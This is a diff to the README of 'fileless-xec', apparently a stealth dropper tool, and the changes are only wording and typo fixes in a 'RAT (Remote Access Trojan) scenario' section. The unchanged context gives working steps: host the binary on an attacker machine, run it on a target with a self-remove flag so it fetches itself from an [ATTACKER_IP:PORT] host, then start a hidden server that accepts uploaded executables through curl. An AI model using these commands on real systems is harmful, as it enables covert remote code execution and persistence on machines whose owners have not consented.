@@ -142,14 +142,14 @@ go build ./example/client/client.go
 ### RAT (Remote Access Trojan) scenario
 
 fileless-xec is a dropper that make your program execution stealth. But we can go further and launch a stealth fileless-xec server (RAT), that will wait for program execution
-
+*ie Use fileless-xec to launch a stealth fileless-xec server*
 1. On attacker machine build/download fileless-xec and expose it trough HTTP server:
 ```
 # in the same folder of fileless-xec binary
 python3 -m http.server 11211
 ```
 
-2. On target machine launch your stealth fileless-xec (with an "unstealth" one):
+2. On target machine launch your stealth fileless-xec server w/ fileless-xec:
 ```
 ./fileless-xec --self-remove http://[ATTACKER_IP:PORT]/fileless-xec -- serve 11211
 ```
@@ -162,7 +162,7 @@ curl -X POST -F "executable=@[BINARY_FILENAME]" http://[TARGET_IP]:11211/upload
 ## `fileless-xec` on windows
 
 You could alse use `fileless-xec` on windows.
-Build `filess-xec.exe` with Makefile:
+Build `fileless-xec.exe` with Makefile:
 ```
 make windows.build.fileless-xec
 ```
